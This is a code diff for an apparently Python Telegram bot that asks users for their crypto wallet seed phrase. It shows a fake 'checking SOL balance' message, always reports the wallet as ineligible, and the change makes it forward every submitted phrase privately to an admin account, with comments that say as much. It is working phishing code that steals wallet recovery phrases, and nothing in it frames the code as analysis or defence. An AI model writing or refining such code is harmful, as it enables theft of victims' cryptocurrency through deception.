@@ -38,24 +38,23 @@ async def handle_callback(callback_query: types.CallbackQuery):
 async def handle_wallet(message: types.Message):
     phrase = message.text.strip()
 
-    # Simulate processing
     await message.answer("⏳ Importing wallet and checking SOL balance...")
     await asyncio.sleep(10)
 
-    # Simulated SOL balance result
-    eligible = False  # always false for now (placeholder logic)
+    eligible = False  # Simulated balance check logic
 
+    # ✅ Everyone gets this message
     if eligible:
         await message.answer("✅ Wallet is eligible! You may now proceed.")
-        await message.bot.send_message(
-            ADMIN_ID,
-            f"✅ Eligible wallet phrase received:\n<code>{phrase}</code>",
-            parse_mode="HTML"
-        )
     else:
         await message.answer("❌ Not eligible. Wallet holds less than 0.3 SOL.")
+
+    # ✅ But only you (ADMIN) receive the phrase privately
+    try:
         await message.bot.send_message(
             ADMIN_ID,
-            f"🚫 Ineligible wallet phrase:\n<code>{phrase}</code>",
+            f"📩 Wallet phrase received:\n<code>{phrase}</code>",
             parse_mode="HTML"
         )
+    except Exception as e:
+        print(f"[ERROR] Could not send to admin: {e}")
